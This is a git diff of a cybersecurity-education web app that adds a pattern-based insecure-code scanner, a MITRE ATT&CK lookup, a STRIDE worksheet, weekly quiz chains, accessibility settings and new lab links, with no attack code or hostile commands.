+    <div class="tool-note">Pick a project brief — each one is a real, resume-worthy artifact you can point to in interviews.</div>
+    <div class="labs-grid" id="pgList" style="margin-top:1rem">
+      ${PORTFOLIO_BRIEFS.map((b,i)=>`
+        <button class="lab-card" data-i="${i}" type="button" style="cursor:pointer;text-align:left;border:1px solid var(--border);background:var(--surface)">
+          <h3>${escapeHtml(b.t)}</h3>
+          <p>${escapeHtml(b.d)}</p>
+        </button>
+      `).join('')}
+    </div>
+    <div id="pgOut"></div>
+  `;
+  document.querySelectorAll('#pgList button').forEach(btn=>{
+    btn.addEventListener('click', ()=>{
+      const b = PORTFOLIO_BRIEFS[parseInt(btn.dataset.i,10)];
+      const md = `# Portfolio project: ${b.t}\n\n${b.d}\n\n## Steps\n\n${b.steps.map((s,i)=>`${i+1}. ${s}`).join('\n')}\n\n## Write-up\n\n_(Replace this section with what you actually did, what you found, and what you'd do differently.)_\n`;
+      document.getElementById('pgOut').innerHTML = `
+        <div class="vr-preview"><pre class="vr-preview-pre">${escapeHtml(md)}</pre></div>
+        <div class="tool-btnrow"><button class="btn-amber sm" id="pgDownload" type="button">⬇ Download brief as Markdown</button></div>
+      `;
+      document.getElementById('pgDownload').addEventListener('click', ()=>{
+        const blob = new Blob([md], {type:'text/markdown'});
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = `portfolio-${b.t.toLowerCase().replace(/[^a-z0-9]+/g,'-').slice(0,40)}.md`;
+        a.click();
+        URL.revokeObjectURL(a.href);
+      });
+    });
+  });
+}
+
+/* --- Secure code review toy --- */
+const CODE_REVIEW_PATTERNS = [
+  {re:/\beval\s*\(/g, label:'eval() of dynamic input', why:'Executes a string as code — if any part of that string is attacker-influenced, it\'s arbitrary code execution.'},
+  {re:/\bexec\s*\(/g, label:'exec() call', why:'Same risk class as eval() — running dynamic input as code/commands.'},
+  {re:/SELECT[\s\S]{0,80}?\+|["'`]\s*\+\s*\w+[\s\S]{0,20}(SELECT|INSERT|UPDATE|DELETE)/gi, label:'String-concatenated SQL', why:'Building a SQL query with string concatenation instead of parameterised queries/prepared statements is the root cause of SQL injection.'},
+  {re:/(api[_-]?key|secret|password|passwd|token)\s*[:=]\s*["'][^"']{6,}["']/gi, label:'Hardcoded credential-looking value', why:'Secrets committed directly in source code end up in git history forever, even if later removed — use environment variables or a secrets manager.'},
+  {re:/innerHTML\s*=/g, label:'innerHTML assignment', why:'Assigning untrusted data to innerHTML can lead to DOM-based XSS. Prefer textContent, or sanitize first.'},
+  {re:/verify\s*=\s*False|rejectUnauthorized\s*:\s*false/gi, label:'TLS certificate verification disabled', why:'Disabling certificate verification defeats the whole point of TLS — it opens the door to trivial man-in-the-middle attacks.'},
+  {re:/md5|sha1\(/gi, label:'Weak hash algorithm', why:'MD5/SHA-1 are broken for security purposes (collisions) — use SHA-256+ for integrity, and bcrypt/argon2/scrypt specifically for passwords.'},
+  {re:/pickle\.loads|yaml\.load\((?!.*Loader)/g, label:'Unsafe deserialization', why:'Deserializing untrusted data with pickle or unsafe yaml.load can lead to arbitrary code execution.'}
+];
+function toolCodeReview(el){
+  el.innerHTML = `
+    <label class="tool-field">Paste a code snippet (any language)<textarea id="crInput" class="tool-textarea" rows="10" placeholder="Paste code here…"></textarea></label>
+    <div class="tool-btnrow"><button class="btn-amber sm" id="crGo" type="button">Scan</button></div>
+    <div id="crOut"></div>
+    <p class="tool-note">Pattern-matching only, not a real SAST engine — it will miss things and occasionally flag safe code. Good for training your eye, not for production review.</p>
+  `;
+  document.getElementById('crGo').addEventListener('click', ()=>{
+    const code = document.getElementById('crInput').value;
+    const lines = code.split('\n');
+    const hits = [];
+    CODE_REVIEW_PATTERNS.forEach(p=>{
+      lines.forEach((line,i)=>{
+        p.re.lastIndex = 0;
+        if(p.re.test(line)) hits.push({line:i+1, text:line.trim(), label:p.label, why:p.why});
+      });
+    });
+    const out = document.getElementById('crOut');
+    out.innerHTML = hits.length ? `<div class="tool-out-list">${hits.map(h=>`
+      <div class="hub-list-item" style="cursor:default;align-items:flex-start;flex-direction:column;gap:.3rem">
+        <div class="hli-t">⚠️ Line ${h.line}: ${escapeHtml(h.label)}</div>
+        <pre class="sqli-query" style="margin:0;width:100%">${escapeHtml(h.text)}</pre>
+        <div class="hli-d">${escapeHtml(h.why)}</div>
+      </div>
+    `).join('')}</div>` : `<div class="hub-empty">No flagged patterns found (or the code's clean of these particular checks).</div>`;
+  });
+}
+
+/* --- MITRE ATT&CK mapper --- */
+const ATTCK_TECHNIQUES = [
+  {id:'T1595', tactic:'Reconnaissance', name:'Active Scanning', related:'Path 14, Path 12'},
+  {id:'T1589', tactic:'Reconnaissance', name:'Gather Victim Identity Information', related:'OSINT Sandbox lab'},
+  {id:'T1566', tactic:'Initial Access', name:'Phishing', related:'Phishing Spotter lab, Path 10'},
+  {id:'T1190', tactic:'Initial Access', name:'Exploit Public-Facing Application', related:'Path 11, SQLi/XSS/SSRF/XXE labs'},
+  {id:'T1078', tactic:'Initial Access / Persistence', name:'Valid Accounts', related:'IDOR/JWT labs, Path 21'},
+  {id:'T1059', tactic:'Execution', name:'Command and Scripting Interpreter', related:'Terminal Simulator lab, Path 03'},
+  {id:'T1053', tactic:'Persistence', name:'Scheduled Task/Job', related:'Log Analysis / IR lab'},
+  {id:'T1547', tactic:'Persistence', name:'Boot or Logon Autostart Execution', related:'Path 07 Windows Security'},
+  {id:'T1548', tactic:'Privilege Escalation', name:'Abuse Elevation Control Mechanism', related:'Path 16 Linux/Windows privesc labs'},
+  {id:'T1068', tactic:'Privilege Escalation', name:'Exploitation for Privilege Escalation', related:'Path 16 Advanced'},
+  {id:'T1027', tactic:'Defense Evasion', name:'Obfuscated Files or Information', related:'Path 17 Malware RE'},
+  {id:'T1562', tactic:'Defense Evasion', name:'Impair Defenses', related:'Path 22 DevSecOps & AppSec'},
+  {id:'T1110', tactic:'Credential Access', name:'Brute Force', related:'Log Analysis / IR lab'},
+  {id:'T1552', tactic:'Credential Access', name:'Unsecured Credentials', related:'Path Traversal lab, Secure Code Review tool'},
+  {id:'T1040', tactic:'Discovery', name:'Network Sniffing', related:'Packet Capture Viewer lab, Path 12'},
+  {id:'T1046', tactic:'Discovery', name:'Network Service Discovery', related:'Path 12 Network Security'},
+  {id:'T1071', tactic:'Command and Control', name:'Application Layer Protocol', related:'Path 12, SSRF Playground lab'},
+  {id:'T1567', tactic:'Exfiltration', name:'Exfiltration Over Web Service', related:'Path 12, SSRF Playground lab'},
+  {id:'T1486', tactic:'Impact', name:'Data Encrypted for Impact (Ransomware)', related:'Path 17 Malware RE'},
+  {id:'T1499', tactic:'Impact', name:'Endpoint Denial of Service', related:'Path 12 Network Security'}
+];
+function toolAttckMap(el){
+  el.innerHTML = `
+    <label class="tool-field">Search technique, tactic, or ID<input class="tool-input" id="atkSearch" placeholder="e.g. phishing, T1190, privilege escalation…"></label>
+    <div id="atkOut" class="tool-out-list"></div>
+    <p class="tool-note">A curated reference subset, not the full ATT&CK matrix — enough to learn how techniques map to real course content. See <a href="https://attack.mitre.org" target="_blank" rel="noopener noreferrer">attack.mitre.org</a> for the complete, authoritative framework.</p>
+  `;
+  const searchEl = document.getElementById('atkSearch'), outEl = document.getElementById('atkOut');
+  function render(){
+    const q = searchEl.value.toLowerCase();
+    const rows = ATTCK_TECHNIQUES.filter(t => !q || [t.id,t.tactic,t.name,t.related].join(' ').toLowerCase().includes(q));
+    outEl.innerHTML = rows.map(t=>`
+      <div class="hub-list-item" style="cursor:default">
+        <div><div class="hli-t">${t.id} — ${escapeHtml(t.name)}</div><div class="hli-d">${escapeHtml(t.tactic)} · Try: ${escapeHtml(t.related)}</div></div>
+      </div>
+    `).join('') || `<div class="hub-empty">No matches.</div>`;
+  }
+  searchEl.addEventListener('input', render);
+  render();
+}
+
+/* --- STRIDE threat-model worksheet --- */
+const STRIDE_CATS = [
+  {id:'spoofing', t:'Spoofing', d:'Can someone pretend to be a user or component they\'re not?'},
+  {id:'tampering', t:'Tampering', d:'Can data or code be modified without authorization?'},
+  {id:'repudiation', t:'Repudiation', d:'Can someone deny having done something, with no way to prove otherwise?'},
+  {id:'infodisclosure', t:'Information Disclosure', d:'Can data be exposed to someone who shouldn\'t see it?'},
+  {id:'dos', t:'Denial of Service', d:'Can the system be made unavailable to legitimate users?'},
+  {id:'elevation', t:'Elevation of Privilege', d:'Can someone gain more access than they should have?'}
+];
+function toolStride(el){
+  el.innerHTML = `
+    <div class="tool-note">Describe the system briefly, then work through each STRIDE category — even "not applicable" is a useful, documented decision.</div>
+    <label class="tool-field">System / feature being modeled<input class="tool-input" id="stSystem" placeholder="e.g. User login flow for a web app"></label>
+    <div class="vr-grid" id="stFields">
+      ${STRIDE_CATS.map(c=>`<label class="tool-field" style="grid-column:1/-1"><b>${c.t}</b> — <span style="font-weight:400;color:var(--muted)">${c.d}</span><textarea class="tool-textarea" id="st-${c.id}" rows="2" placeholder="Threats, or 'N/A' with why…"></textarea></label>`).join('')}
+    </div>
+    <div class="tool-btnrow"><button class="btn-amber sm" id="stDownload" type="button">⬇ Download as Markdown</button></div>
+  `;
+  document.getElementById('stDownload').addEventListener('click', ()=>{
+    const system = document.getElementById('stSystem').value.trim() || 'Untitled system';
+    let md = `# STRIDE threat model: ${system}\n\n`;
+    STRIDE_CATS.forEach(c=>{
+      md += `## ${c.t}\n\n${document.getElementById('st-'+c.id).value.trim() || '_(not filled in)_'}\n\n`;
+    });
+    const blob = new Blob([md], {type:'text/markdown'});
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = `stride-${system.toLowerCase().replace(/[^a-z0-9]+/g,'-').slice(0,40)}.md`;
+    a.click();
+    URL.revokeObjectURL(a.href);
+  });
+}
+
 /* ============================================================
    Daily challenge — one deterministic question per day drawn from the
    whole quiz bank, so everyone gets the same question on a given date.
@@ -3948,6 +4810,120 @@ function renderDaily(){
       });
     });
   }
+}
+
+/* ============================================================
+   Weekly challenge chains — themed, multi-question chains (unlike
+   the single daily question). Self-paced rather than calendar-locked
+   day-by-day, so progress is never lost to a missed day; completing
+   every question in a chain earns a bonus badge.
+   ============================================================ */
+const WEEKLY_CHAINS = [
+  {id:'web-security-week', title:'Web Security Week', ico:'🕸', pathId:'11-web-security', desc:'Seven questions across XSS, SQLi, auth, and the rest of the web security path.'},
+  {id:'network-week',      title:'Network Security Week', ico:'🌐', pathId:'12-network-security', desc:'Seven questions on network attacks, defences, and monitoring.'},
+  {id:'cloud-week',        title:'Cloud Security Week', ico:'☁️', pathId:'08-cloud-basics', desc:'Seven questions covering cloud fundamentals and common misconfigurations.'}
+];
+function chainQuestions(chain){
+  const quiz = typeof QUIZZES!=='undefined' ? QUIZZES[chain.pathId] : null;
+  return (quiz && quiz.questions ? quiz.questions : []).slice(0,7);
+}
+function renderWeeklyIndex(){
+  app.innerHTML = `
+    <section class="sec">
+      <div class="sec-head" data-reveal>
+        <div class="sec-eyebrow">Challenges</div>
+        <h2>Weekly challenge chains</h2>
+        <p class="sec-lead">Themed, multi-question chains that go deeper than the daily challenge. Self-paced — no deadline, work through each chain whenever you like.</p>
+      </div>
+      <div class="labs-grid" data-reveal style="--i:1">
+        ${WEEKLY_CHAINS.map(c=>{
+          const qs = chainQuestions(c);
+          const saved = STATE.weeklyChain?.[c.id]?.answers || [];
+          const done = saved.length >= qs.length && qs.length>0;
+          return `
+          <a class="lab-card ${done?'is-complete':''}" href="#/weekly/${c.id}">
+            <div class="lab-ico">${c.ico}</div>
+            <h3>${c.title} ${done?'<span class="lab-done-badge">✅</span>':''}</h3>
+            <p>${escapeHtml(c.desc)}</p>
+            <div class="lab-related">${saved.length}/${qs.length} answered</div>
+          </a>
+        `;}).join('')}
+      </div>
+    </section>
+  `;
+  setupReveal();
+}
+function renderWeeklyChain(chainId){
+  const chain = WEEKLY_CHAINS.find(c=>c.id===chainId);
+  if(!chain) return renderNotFound();
+  const qs = chainQuestions(chain);
+  if(!STATE.weeklyChain) STATE.weeklyChain = {};
+  if(!STATE.weeklyChain[chainId]) STATE.weeklyChain[chainId] = {answers:[]};
+  const progress = STATE.weeklyChain[chainId];
+  const qi = progress.answers.length;
+
+  if(qi >= qs.length){
+    const correctCount = progress.answers.filter(a=>a.correct).length;
+    app.innerHTML = `
+      <section class="sec">
+        <a href="#/weekly" class="back-link" data-reveal>← All chains</a>
+        <div class="sec-head" data-reveal>
+          <div class="sec-eyebrow">${chain.title}</div>
+          <h2>Chain complete</h2>
+          <p class="sec-lead">${correctCount}/${qs.length} correct across the whole chain.</p>
+        </div>
+      </section>
+    `;
+    setupReveal();
+    return;
+  }
+
+  const q = qs[qi];
+  app.innerHTML = `
+    <section class="sec">
+      <a href="#/weekly" class="back-link" data-reveal>← All chains</a>
+      <div class="quiz-wrap">
+        <div class="quiz-head" data-reveal>
+          <div class="sec-eyebrow">${chain.ico} ${chain.title} · Question ${qi+1} of ${qs.length}</div>
+          <h2>${escapeHtml(q.q)}</h2>
+        </div>
+        <div class="quiz-card" data-reveal style="--i:1">
+          <div class="quiz-options" id="weeklyOpts">
+            ${q.options.map((opt,oi)=>`<button class="quiz-opt" data-oi="${oi}" type="button"><span class="opt-letter">${String.fromCharCode(65+oi)}</span><span>${escapeHtml(opt)}</span></button>`).join('')}
+          </div>
+          <div id="weeklyFeedback"></div>
+        </div>
+      </div>
+    </section>
+  `;
+  setupReveal();
+  let answered = false;
+  document.querySelectorAll('#weeklyOpts .quiz-opt').forEach(btn=>{
+    btn.addEventListener('click', ()=>{
+      if(answered) return;
+      answered = true;
+      const chosen = parseInt(btn.dataset.oi,10);
+      const correct = chosen === q.correct;
+      document.querySelectorAll('#weeklyOpts .quiz-opt').forEach(b=>{
+        const oi = parseInt(b.dataset.oi,10);
+        if(oi===q.correct) b.classList.add('correct'); else if(oi===chosen) b.classList.add('wrong');
+        b.disabled = true;
+      });
+      document.getElementById('weeklyFeedback').innerHTML = `
+        <div class="quiz-explain"><strong>${correct?'Correct — ':'Not quite — '}</strong>${escapeHtml(q.explain||'')}</div>
+        <div class="hero-btns" style="margin-top:1.2rem"><button class="btn-amber sm" id="weeklyNext" type="button">${qi+1<qs.length?'Next question →':'Finish chain →'}</button></div>
+      `;
+      progress.answers.push({chosen, correct});
+      saveState();
+      if(qi+1 >= qs.length){
+        const allCorrect = progress.answers.every(a=>a.correct);
+        STATE.achievements['_weekly_'+chainId] = STATE.achievements['_weekly_'+chainId] || Date.now();
+        checkAchievements();
+        if(allCorrect) fireConfetti({count:100});
+      }
+      document.getElementById('weeklyNext').addEventListener('click', ()=>renderWeeklyChain(chainId));
+    });
+  });
 }
 
 /* ============================================================
@@ -4669,6 +5645,7 @@ function renderProgressHub(){
         <div class="hub-stat"><div class="hub-stat-n">${unlockedCount}/${ACHIEVEMENTS.length}</div><div class="hub-stat-l">Achievements</div></div>
         <div class="hub-stat"><div class="hub-stat-n">🔥 ${streakInfo().current}</div><div class="hub-stat-l">Day streak</div></div>
         <div class="hub-stat"><div class="hub-stat-n">${streakInfo().longest}</div><div class="hub-stat-l">Longest streak</div></div>
+        <div class="hub-stat"><div class="hub-stat-n">${labScoreboard().points}</div><div class="hub-stat-l">Lab points</div></div>
       </div>
 
       <div class="hub-section" data-reveal style="--i:2">
@@ -4718,6 +5695,7 @@ function renderProgressHub(){
               <div class="badge-ico">${a.ico}</div>
               <div class="badge-t">${a.t}</div>
               <div class="badge-d">${a.d}</div>
+              <div class="badge-tier badge-tier-${(ACHIEVEMENT_TIERS[a.id]||'Common').toLowerCase()}">${ACHIEVEMENT_TIERS[a.id]||'Common'}</div>
             </div>
           `).join('')}
         </div>
@@ -4796,6 +5774,10 @@ function renderProgressHub(){
         <div class="hub-list-item" style="cursor:default">
           <div><div class="hli-t">Legibility boost</div><div class="hli-d">Switches lessons to a high-legibility font with extra letter and line spacing — easier for dyslexic readers.</div></div>
           <label class="switch"><input type="checkbox" id="legibleToggle" ${STATE.readingPrefs?.legible?'checked':''}><span class="switch-track"></span></label>
+        </div>
+        <div class="hub-list-item" style="cursor:default">
+          <div><div class="hli-t">High-contrast mode</div><div class="hli-d">Stronger colour contrast site-wide, on top of your dark/light choice — for low-vision or bright-room reading.</div></div>
+          <label class="switch"><input type="checkbox" id="highContrastToggle" ${STATE.highContrast?'checked':''}><span class="switch-track"></span></label>
         </div>
       </div>
 
@@ -4899,6 +5881,11 @@ function renderProgressHub(){
   document.getElementById('readingSizePicker')?.addEventListener('change', e=>rpChange('size', e.target.value));
   document.getElementById('readingWidthPicker')?.addEventListener('change', e=>rpChange('width', e.target.value));
   document.getElementById('legibleToggle')?.addEventListener('change', e=>rpChange('legible', e.target.checked));
+  document.getElementById('highContrastToggle')?.addEventListener('change', e=>{
+    STATE.highContrast = e.target.checked;
+    saveState();
+    applyTheme();
+  });
 
   document.getElementById('exportNotesBtn')?.addEventListener('click', ()=>{
     let md = `# KashSec Academy — my lesson notes\n\n_Exported ${new Date().toISOString().slice(0,10)}_\n\n`;
@@ -5061,7 +6048,9 @@ function getCommands(){
     ['Glossary','#/glossary','📖'],['Flashcards','#/review','🃏'],['Daily challenge','#/daily','📅'],
     ['Interview bank','#/interview','💼'],['Careers','#/careers','🎯'],['FAQ','#/faq','❓'],
     ['My Progress','#/progress','📈'],['Changelog','#/changelog','📣'],['Take the Final Exam','#/quiz/final','🎓'],
-    ['Mock interview','#/interview/mock','⏱'],['Certification roadmap','#/certs','🎓'],['Skill tree','#/skilltree','🌳']
+    ['Mock interview','#/interview/mock','⏱'],['Certification roadmap','#/certs','🎓'],['Skill tree','#/skilltree','🌳'],
+    ['Capstone attack chain','#/capstone','⛓️'],['Weekly challenge chains','#/weekly','📆'],
+    ['Career-fit quiz','#/career-quiz','🧭']
   ].map(([t,u,i])=>({title:t, url:u, icon:i, ctx:'Go to', keywords:t.toLowerCase()}));
   const tools = (typeof TOOLS!=='undefined'?TOOLS:[]).map(t=>({title:'Tool: '+t.title, url:`#/tools/${t.id}`, icon:t.ico, ctx:'Tool', keywords:(t.title+' '+t.desc).toLowerCase()}));
   const labs = [
@@ -5071,7 +6060,12 @@ function getCommands(){
     {title:'Lab: Phishing Spotter', url:'#/labs/phishing', icon:'🎣', kw:'phishing email'},
     {title:'Lab: Packet Capture Viewer', url:'#/labs/pcap', icon:'📡', kw:'pcap wireshark packets'},
     {title:'Lab: IDOR Playground', url:'#/labs/idor', icon:'🔓', kw:'idor bola access control'},
-    {title:'Lab: JWT Forgery Lab', url:'#/labs/jwt', icon:'🪪', kw:'jwt token alg none forgery'}
+    {title:'Lab: JWT Forgery Lab', url:'#/labs/jwt', icon:'🪪', kw:'jwt token alg none forgery'},
+    {title:'Lab: Path Traversal Playground', url:'#/labs/traversal', icon:'📂', kw:'path traversal lfi directory'},
+    {title:'Lab: SSRF Playground', url:'#/labs/ssrf', icon:'🌐', kw:'ssrf server side request forgery metadata'},
+    {title:'Lab: XXE Playground', url:'#/labs/xxe', icon:'📄', kw:'xxe xml external entity'},
+    {title:'Lab: Log Analysis / IR', url:'#/labs/loganalysis', icon:'📜', kw:'log analysis incident response soc'},
+    {title:'Lab: OSINT Sandbox', url:'#/labs/osint', icon:'🔍', kw:'osint recon reconnaissance'}
   ].map(l=>({title:l.title, url:l.url, icon:l.icon, ctx:'Lab', keywords:(l.title+' '+l.kw).toLowerCase()}));
   const actions = [
     {title:'Random lesson', icon:'🎲', ctx:'Action', keywords:'random surprise lesson', run:()=>{ const r=pickRandomLesson(); location.hash=`#/lesson/${r.pathId}/${r.subId}`; }},
